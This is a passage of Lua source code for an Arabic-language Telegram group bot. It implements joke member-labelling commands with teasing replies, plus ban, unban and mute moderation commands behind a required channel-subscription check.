t = t..""..k.."> الضلعه `"..v.."`\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد ضلعه"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع ضلعه") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local  statuss  = '\n ⊀︰ تم ارفع ضلعه في الكروب\n ⊀︰ تعاي صرتي من ضلعاتي تمكيجي وخل نروح للمول نرقم صاكين'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("نزل ضلعه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم نزل ضلعه من الكروب\n ⊀︰ دمشي ولي ملطخه وجهه تلطخ وتريد ترقم صاكين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'نزل البقرات' and Mod(msg) then
database:del(bot_id..'Bakra:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم نزل جميع البقرات بالكروب')
end
if text == ("تاك للبقرات") and Mod(msg) then
local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة البقرات الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> البقره [@"..username.."]\n"
else
t = t..""..k.."> البقره "..v.."\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد البقره"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع بقره") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local  statuss  = '\n ⊀︰ تم ارفع بقره في الكروب\n ⊀︰ ها يالهايشه تع احلبك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("نزل بقره")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم نزل بقره من الكروب\n ⊀︰ تعال هاك حليب مالتك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'نزل الطليان' and Mod(msg) then
database:del(bot_id..'Tele:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم نزل جميع طليان بالكروب')
end
if text == ("تاك للطليان") and Mod(msg) then
local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة الطليان الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> الطلي[@"..username.."]\n"
else
t = t..""..k.."> الطلي "..v.."\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد طلي"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع طلي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local  statuss  = '\n ⊀︰ تم ارفع الطلي في الكروب\n ⊀︰ طلع برا ابو البعرور الوصخ'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("نزل طلي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم نزل الطلي من الكروب\n ⊀︰ هاك اخذ بعرور'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'نزل الزواحف' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم نزل جميع زواحف')
end
if text == ("تاك للزواحف") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة الزواحف الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> الزاحف [@"..username.."]\n"
else
t = t..""..k.."> الزاحف "..v.."\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد زاحف"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع زاحف") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local  statuss  = '\n ⊀︰ تم ارفع زاحف في الكروب\n ⊀︰ كمشتك حبي جيب رقم'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("نزل زاحف")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم نزل زاحف من الكروب\n ⊀︰ هاك حبي هاذا رقم مالك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'نزل جريذيه' and Mod(msg) then
database:del(bot_id..'Jred:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم نزل جميع جريزي')
end
if text == ("تاك للجريذيه") and Mod(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة الجريذيه الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> الجريذي [@"..username.."]\n"
else
t = t..""..k.."> الجريذي "..v.."\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد جريذي"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع جريذي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local  statuss  = '\n ⊀︰ تم ارفع جريذي في الكروب\n ⊀︰ خايس ريحتك موتتنه روح سبح يع'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("نزل جريذي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم نزل جريذي من الكروب\n ⊀︰ هاك ليفه اسبح'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
---------------------------------------------
if text == 'مسح المحظورين' and Mod(msg) then
database:del(bot_id..'Ban:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ⊀︰ تم مسح المحظورين')
end
if text == ("المحظورين") then
local list = database:smembers(bot_id..'Ban:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة محظورين الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد محظورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *⊀︰ تم تعطيل الحظر*') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "*⊀︰ لا تسطيع حظر البوت*")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'*⊀︰ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها*') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم حظره*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text and text:match("^حظر @(.*)$") and Mod(msg) then
local username = text:match("^حظر @(.*)$")
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *⊀︰ تم تعطيل الحظر*') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع حظر ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'*⊀︰ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها*') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ المستخدم >* ['..result.title_..'](t.me/'..(username or 'GLOBLA')..')'
status  = '\n *⊀︰ تم حظره*'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, '*⊀︰ لا يوجد حساب بهاذا المعرف*')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^حظر (%d+)$") and Mod(msg) then
local userid = text:match("^حظر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *⊀︰ تم تعطيل الحظر*') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ لا تسطيع حظر البوت")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع حظر ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'*⊀︰ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها*') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, userid)
chat_kick(msg.chat_id_, userid)  
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم حظره*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم حظره*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end,nil)   
end
return false
end
if text == ("الغاء حظر") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' ⊀︰ انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء حظره*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
 
if text and text:match("^الغاء حظر @(.*)$") and Mod(msg) then
local username = text:match("^الغاء حظر @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' ⊀︰ انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء حظره*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء حظر (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء حظر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' ⊀︰ انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, userid)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء حظره*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم الغاء حظره*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المكتومين' and Mod(msg) then
database:del(bot_id..'Muted:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '* ⊀︰ تم مسح المكتومين*')
end
if text == ("المكتومين") and Mod(msg) then
local list = database:smembers(bot_id..'Muted:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة المكتومين \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد مكتومين*"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع كتم ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم كتمه*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
